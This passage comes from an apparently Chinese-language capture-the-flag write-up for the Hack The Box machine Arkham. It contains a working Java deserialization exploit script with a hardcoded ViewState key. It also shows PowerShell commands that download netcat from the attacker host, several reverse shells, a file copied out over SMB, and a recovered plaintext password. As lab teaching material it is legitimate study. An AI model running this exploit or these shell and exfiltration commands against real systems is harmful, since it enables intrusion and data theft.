+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>import subprocess
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>import sys
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>from base64 import b64encode
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>from Crypto.Cipher import DES
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>from Crypto.Hash import SHA, HMAC
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>from os import devnull
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>from urllib.parse import quote_plus as urlencode
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>
+<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>
+<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>with open(devnull, &#39;w&#39;) as null:
+<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>    payload = subprocess.check_output([&#39;java&#39;, &#39;-jar&#39;, &#39;/root/hackthebox/Machines/Arkham/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar&#39;, sys.argv[1], sys.argv[2]], stderr=null)
+<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>
+<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>pad = (8 - (len(payload) % 8)) % 8
+<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>padded = payload + (chr(pad)*pad).encode()
+<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>
+<a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>d = DES.new(b&#39;JsF9876-&#39;, DES.MODE_ECB)
+<a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>enc_payload = d.encrypt(padded)
+<a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>sig = HMAC.new(b&#39;JsF9876-&#39;, enc_payload, SHA).digest()
+<a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a>viewstate = b64encode(enc_payload + sig)
+<a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a>
+<a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a>sess = requests.session()
+<a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a>sess.get(&#39;http://10.10.10.130:8080/userSubscribe.faces&#39;)
+<a id="__codelineno-19-24" name="__codelineno-19-24" href="#__codelineno-19-24"></a>resp = sess.post(&#39;http://10.10.10.130:8080/userSubscribe.faces&#39;,
+<a id="__codelineno-19-25" name="__codelineno-19-25" href="#__codelineno-19-25"></a>        data = {&#39;j_id_jsp_1623871077_1%3Aemail&#39;: &#39;d&#39;,
+<a id="__codelineno-19-26" name="__codelineno-19-26" href="#__codelineno-19-26"></a>                &#39;j_id_jsp_1623871077_1%3Asubmit&#39;: &#39;SIGN+UP&#39;,
+<a id="__codelineno-19-27" name="__codelineno-19-27" href="#__codelineno-19-27"></a>                &#39;j_id_jsp_1623871077_1_SUBMIT&#39;: &#39;1&#39;,
+<a id="__codelineno-19-28" name="__codelineno-19-28" href="#__codelineno-19-28"></a>                &#39;javax.faces.ViewState&#39;: viewstate})
+</code></pre></div>
+<p>启动本地监听</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>tcpdump -i tun0 icmp
+</code></pre></div>
+<p>使用脚本执行 ping 命令</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>python3 exploit.py BeanShell1 &#39;ping 10.10.14.14&#39;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>root@kali# tcpdump -i tun0 icmp
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>16:27:33.898247 IP 10.10.10.130 &gt; kali: ICMP echo request, id 1, seq 1, length 40
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>16:27:33.898266 IP kali &gt; 10.10.10.130: ICMP echo reply, id 1, seq 1, length 40
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>16:27:34.910181 IP 10.10.10.130 &gt; kali: ICMP echo request, id 1, seq 2, length 40
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>16:27:34.910199 IP kali &gt; 10.10.10.130: ICMP echo reply, id 1, seq 2, length 40
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>16:27:35.925949 IP 10.10.10.130 &gt; kali: ICMP echo request, id 1, seq 3, length 40
+<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>16:27:35.925964 IP kali &gt; 10.10.10.130: ICMP echo reply, id 1, seq 3, length 40
+<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>16:27:36.938872 IP 10.10.10.130 &gt; kali: ICMP echo request, id 1, seq 4, length 40
+<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a>16:27:36.938903 IP kali &gt; 10.10.10.130: ICMP echo reply, id 1, seq 4, length 40
+</code></pre></div>
+<p>成功收到 ping 命令，反序列化漏洞验证成功</p>
+<h2 id="shell">获取shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
+<p>为了获取目标站点的shell，我们把 nc64.exe 放在本目录下并开启 http 服务</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>python -m SimpleHTTPServer 80
+</code></pre></div>
+<p>在本地开启监听，接收反弹shell</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a> nc -nvlp 443
+</code></pre></div>
+<p>这里需要在 exploit.py 进行略微修改，源码如下</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>#!/usr/bin/env python3
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>import requests
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>import subprocess
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>import sys
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>from base64 import b64encode
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>from Crypto.Cipher import DES
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>from Crypto.Hash import SHA, HMAC
+<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>from os import devnull
+<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>from urllib.parse import quote_plus as urlencode
+<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>
+<a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>
+<a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>with open(devnull, &#39;w&#39;) as null:
+<a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>    payload = subprocess.check_output([&#39;java&#39;, &#39;-jar&#39;, &#39;/root/hackthebox/Machines/Arkham/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar&#39;, &#39;CommonsCollections5&#39;, sys.argv[1]], stderr=null)
+<a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>
+<a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a>pad = (8 - (len(payload) % 8)) % 8
+<a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>padded = payload + (chr(pad)*pad).encode()
+<a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>
+<a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>d = DES.new(b&#39;JsF9876-&#39;, DES.MODE_ECB)
+<a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a>enc_payload = d.encrypt(padded)
+<a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a>sig = HMAC.new(b&#39;JsF9876-&#39;, enc_payload, SHA).digest()
+<a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a>viewstate = b64encode(enc_payload + sig)
+<a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a>
+<a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a>sess = requests.session()
+<a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a>sess.get(&#39;http://10.10.10.130:8080/userSubscribe.faces&#39;)
+<a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a>resp = sess.post(&#39;http://10.10.10.130:8080/userSubscribe.faces&#39;,
+<a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a>        data = {&#39;j_id_jsp_1623871077_1%3Aemail&#39;: &#39;d&#39;,
+<a id="__codelineno-25-28" name="__codelineno-25-28" href="#__codelineno-25-28"></a>                &#39;j_id_jsp_1623871077_1%3Asubmit&#39;: &#39;SIGN+UP&#39;,
+<a id="__codelineno-25-29" name="__codelineno-25-29" href="#__codelineno-25-29"></a>                &#39;j_id_jsp_1623871077_1_SUBMIT&#39;: &#39;1&#39;,
+<a id="__codelineno-25-30" name="__codelineno-25-30" href="#__codelineno-25-30"></a>                &#39;javax.faces.ViewState&#39;: viewstate})
+</code></pre></div>
+<p>执行以下命令上传 nc 并使用 nc 连接本地443端口</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>python3 exploit2.py &quot;powershell -c Invoke-Webrequest -uri &#39;http://10.10.14.14/nc64.exe&#39; -outfile \windows\system32\spool\drivers\color\nc.exe&quot;
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>python3 exploit2.py &quot;\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.14 443&quot;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>root@kali# nc -lnvp 443
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>Ncat: Version 7.70 ( https://nmap.org/ncat )
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>Ncat: Listening on :::443
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>Ncat: Listening on 0.0.0.0:443
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>Ncat: Connection from 10.10.10.130.
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>Ncat: Connection from 10.10.10.130:49720.
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>Microsoft Windows [Version 10.0.17763.107]
+<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>(c) 2018 Microsoft Corporation. All rights reserved.
+</code></pre></div>
+<p>成功收到反弹shell，在当前用户的桌面上找到第一个flag.</p>
+<h1 id="_4">权限提升<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<h2 id="_5">获得密码<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>在主目录下枚举关键文件</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>C:\&gt;dir /s /b /a:-d-h \Users\alfred | findstr /i /v &quot;appdata&quot;
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>dir /s /b /a:-d-h \Users\alfred | findstr /i /v &quot;appdata&quot;
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>C:\Users\alfred\Desktop\user.txt
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>C:\Users\alfred\Documents\tomcat.bat
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>C:\Users\alfred\Downloads\backups\backup.zip
+<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>C:\Users\alfred\Favorites\Bing.url
+<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>C:\Users\alfred\Links\Desktop.lnk
+<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>C:\Users\alfred\Links\Downloads.lnk
+</code></pre></div>
+<blockquote>
+<p>dir: 这个命令用于列出指定目录下的文件和子目录。</p>
+<p>/s: 这个选项告诉 dir 命令<strong>递归地搜索子目录</strong>。</p>
+<p>/b: 这个选项告诉 dir 命令<strong>只输出文件名或目录名</strong>，不显示任何其他信息。</p>
+<p>/a:-d-h: 这个选项告诉 dir 命令<strong>只列出非隐藏的文件和非隐藏的目录</strong>。-d 表示仅列出目录，-h 表示仅列出非隐藏的文件。</p>
+<p>\Users\alfred: 这是指定的目录路径，表示要在 C:\Users\alfred 目录下进行搜索。</p>
+<p>|: 这是管道符号，用于将一个命令的输出传递给另一个命令。</p>
+<p>findstr: 这个命令用于搜索字符串。</p>
+<p>/i: 这个选项告诉 findstr 命令在搜索时<strong>不区分大小写</strong>。</p>
+<p>/v: 这个选项告诉 findstr 命令<strong>显示不匹配的行</strong>。</p>
+<p>"appdata": 这是要搜索的字符串，findstr 将排除包含此字符串的行。</p>
+<p>在 C:\Users\alfred 目录及其所有子目录中，列出所有非隐藏文件和目录的绝对路径，但不包括隐藏的文件和目录，同时排除包含字符串 "appdata" 的行。</p>
+</blockquote>
+<p>发现 backup.zip，我们需要将其下载到本地。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>C:\&gt;net use \\10.10.14.11\share
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>System error 1272 has occurred.
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>You can&#39;t access this shared folder because your organization&#39;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network. 
+</code></pre></div>
+<p>借助 smbserver 来建立 smb 共享，同时设置账号密码，否则无法连接.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>python3 smbserver.py -smb2support -username mac -password mac share .
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>[*] Config file parsed
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>[*] Config file parsed
+<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>[*] Config file parsed
+<a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>[*] Config file parsed
+</code></pre></div>
+<blockquote>
+<p>smbserver.py:Impacket中的一个工具。</p>
+<p>lmpacket教程：https://cloud.tencent.com/developer/article/1937036</p>
+<p>Impacket是用于处理网络协议的Python类的集合，用于对SMB1-3或IPv4 / IPv6 上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。数据包可以从头开始构建，也可以从原始数据中解析，而面向对象的API使处理协议的深层次结构变得简单。</p>
+<p>smbserver.py：SMB服务器的Python实现，允许快速设置共享和用户帐户。</p>
+</blockquote>
+<p>然后连接：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>C:\&gt;net use \\10.10.14.11\share /u:mac mac
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>The command completed successfully.
+</code></pre></div>
+<p>并将文件复制到我的 Kali 中：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>copy C:\Users\Alfred\Downloads\backups\backup.zip \\10.10.14.14\share\
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>        1 file(s) copied.
+</code></pre></div>
+<p>解压该文件，里面包含一个 ost 文件，是 Microsoft Outlook 的脱机文件夹文件</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>root@kali# unzip -l backup.zip 
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>Archive:  backup.zip
+<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>  Length      Date    Time    Name
+<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>---------  ---------- -----   ----
+<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a> 16818176  2019-02-02 18:00   alfred@arkham.local.ost
+<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>---------                     -------
+<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a> 16818176                     1 file
+</code></pre></div>
+<p>readpst是一个从 Linux 解析文件的工具，该工具可以用来解析.pst、.ost文件</p>
+<blockquote>
+<p>Outlook数据提取工具readpst:Outlook是Windows常用的邮件客户端。它将用户的信息保存到.pst文件中，如邮件、约会、日历、联系人等信息。为了便于查看这些信息，Kali Linux内置了一款专用工具集readpst。该工具集可以将.pst文件中的数据提取保存为文本形式mbox。在提取的时候，渗透测试人员按照邮件内容，分目录进行保存。同时，该工具集还可以将数据导出为LDAP专用的.ldif格式和Summation专用的DII格式，便于后期数据的分析。</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>root@kali# readpst alfred@arkham.local.ost 
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>Opening PST file and indexes...
+<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>Processing Folder &quot;Deleted Items&quot;
+<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>Processing Folder &quot;Inbox&quot;
+<a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>Processing Folder &quot;Outbox&quot;
+<a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>Processing Folder &quot;Sent Items&quot;
+<a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>Processing Folder &quot;Calendar&quot;
+<a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>Processing Folder &quot;Contacts&quot;
+<a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>Processing Folder &quot;Conversation Action Settings&quot;
+<a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>Processing Folder &quot;Drafts&quot;
+<a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a>Processing Folder &quot;Journal&quot;
+<a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a>Processing Folder &quot;Junk E-Mail&quot;
+<a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>Processing Folder &quot;Notes&quot;
+<a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>Processing Folder &quot;Tasks&quot;
+<a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a>Processing Folder &quot;Sync Issues&quot;
+<a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a>        &quot;Inbox&quot; - 0 items done, 7 items skipped.
+<a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a>Processing Folder &quot;RSS Feeds&quot;
+<a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a>Processing Folder &quot;Quick Step Settings&quot;
+<a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a>        &quot;alfred@arkham.local.ost&quot; - 15 items done, 0 items skipped.
+<a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a>        &quot;Calendar&quot; - 0 items done, 3 items skipped.
+<a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a>Processing Folder &quot;Conflicts&quot;
+<a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a>Processing Folder &quot;Local Failures&quot;
+<a id="__codelineno-34-23" name="__codelineno-34-23" href="#__codelineno-34-23"></a>Processing Folder &quot;Server Failures&quot;
+<a id="__codelineno-34-24" name="__codelineno-34-24" href="#__codelineno-34-24"></a>        &quot;Sync Issues&quot; - 3 items done, 0 items skipped.
+<a id="__codelineno-34-25" name="__codelineno-34-25" href="#__codelineno-34-25"></a>        &quot;Drafts&quot; - 1 items done, 0 items skipped.
+</code></pre></div>
+<p>这将创建五个文件，但仅不为空：Drafts.mbox</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>-rwxrwx--- 1 root vboxsf     0 Aug  7 02:03 alfred@arkham.local.ost.calendar
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>-rwxrwx--- 1 root vboxsf     0 Aug  7 02:03 alfred@arkham.local.ost.contacts
+<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>-rwxrwx--- 1 root vboxsf     0 Aug  7 02:03 alfred@arkham.local.ost.journal
+<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>-rwxrwx--- 1 root vboxsf     0 Aug  7 02:03 alfred@arkham.local.ost.mbox
+<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>-rwxrwx--- 1 root vboxsf 51857 Aug  7 02:03 Drafts.mbox
+</code></pre></div>
+<p>解压完成是一个.mbox文件，这是一种电子邮件邮箱文件格式，可在单个文件中存储多条消息并将其作为文本。使用 mutt 来打开它.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>mutt -R -f Drafts.mbox
+</code></pre></div>
+<p><img alt="截图" src="80afd237cb65e5b656b56dcadfc31495.png" /></p>
+<p>这是一封给 batman 的邮件，翻到最后存在一个附件</p>
+<p><img alt="截图" src="9788a11ce4f51ebf68517acbf0d68d27.png" /></p>
+<p>通过 v 来查看附件</p>
+<p><img alt="截图" src="56f94f8dbf2978837cab536c866bc96e.png" /></p>
+<p><img alt="截图" src="2b30345c2e655ff820b483b80b82bd4f.png" /></p>
+<p>成功获取到账号密码为batman/Zx^#QZX+T!123</p>
+<h2 id="shell_1">获取shell<a class="headerlink" href="#shell_1" title="Permanent link">&para;</a></h2>
+<p>进入 powershell 来制作凭据</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>powershell
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>$username = &#39;batman&#39;
+<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>$password = &#39;Zx^#QZX+T!123&#39;
+<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>C:\Users\Alfred&gt;powershell
+<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>Windows PowerShell 
+<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>Copyright (C) Microsoft Corporation. All rights reserved.
+<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>
+<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>PS C:\Users\Alfred&gt; $username = &quot;arkham\batman&quot;
+<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>PS C:\Users\Alfred&gt; $password = &quot;Zx^#QZX+T!123&quot;
+<a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>PS C:\Users\Alfred&gt; $secstr = New-Object -TypeName System.Security.SecureString
+<a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>PS C:\Users\Alfred&gt; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+<a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a>PS C:\Users\Alfred&gt; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+<a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a>PS C:\Users\Alfred&gt; new-pssession -computername . -credential $cred
+<a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a>
+<a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a> Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
+<a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a> -- ----            ------------    ------------    -----         -----------------     ------------
+<a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a>  1 WinRM1          localhost       RemoteMachine   Opened        Microsoft.PowerShell     Available
+<a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a>
+<a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a>
+<a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a>PS C:\Users\Alfred&gt; enter-pssession 1
+<a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a>[localhost]: PS C:\Users\Batman\Documents&gt; whoami
+<a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a>arkham\batman
+<a id="__codelineno-38-20" name="__codelineno-38-20" href="#__codelineno-38-20"></a>[localhost]: PS C:\Users\Batman\Documents&gt; \windows\System32\spool\drivers\color\n.exe -e cmd 10.10.14.11 443 
+</code></pre></div>
+<p>成功获得shell</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>root@kali# rlwrap nc -lnvp 443 
+<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>Ncat: Version 7.70 ( https://nmap.org/ncat )
+<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>Ncat: Listening on :::443
+<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>Ncat: Listening on 0.0.0.0:443
+<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>Ncat: Connection from 10.10.10.130.
+<a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>Ncat: Connection from 10.10.10.130:49697.
+<a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>Microsoft Windows [Version 10.0.17763.107]
+<a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>(c) 2018 Microsoft Corporation. All rights reserved.
+<a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>
+<a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a>C:\Users\Batman\Documents&gt;
+</code></pre></div>
+<h1 id="uac">UAC绕过<a class="headerlink" href="#uac" title="Permanent link">&para;</a></h1>
+<p>查看当前用户权限</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>net user batman
+</code></pre></div>
